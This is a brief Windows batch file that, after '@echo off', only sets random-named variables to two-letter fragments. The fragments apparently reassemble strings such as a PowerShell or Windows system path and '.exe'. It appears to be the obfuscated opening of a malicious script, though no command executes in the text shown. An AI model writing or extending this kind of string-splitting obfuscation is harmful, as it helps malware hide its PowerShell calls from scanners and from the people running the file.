@echo off
set "YmgcqQDIVm=ow"
set "pyJsxWkUbA=st"
set "ADnpvAyOUu=py"
set "qrewaRdXOO=Po"
set "OnRFFGzyUf=ll"
set "cpbsNKjvLe=we"
set "xLVqfKAcOL=he"
set "WJEWGbTehd=nd"
set "OVxANorfLK=em"
set "irWrqsDtML=Wi"
set "KAJDWAYZbo=\W"
set "wnAAYQpBro=xe"
